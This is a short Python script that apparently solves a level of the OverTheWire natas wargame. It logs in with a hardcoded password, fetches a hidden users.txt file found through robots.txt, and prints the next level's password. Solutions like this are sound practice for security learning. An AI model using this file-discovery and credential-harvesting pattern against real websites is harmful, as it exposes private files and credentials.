#!/usr/bin/python3

import requests
import re

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

url = 'http://%s.natas.labs.overthewire.org' % username

# response = requests.get(url+'/robots.txt', auth = (username, password))
response = requests.get(url+'/s3cr3t/users.txt', auth = (username, password))
content = response.text
# print(content)

pwd = re.findall('natas5:(.*)', content)[0]
print(pwd)

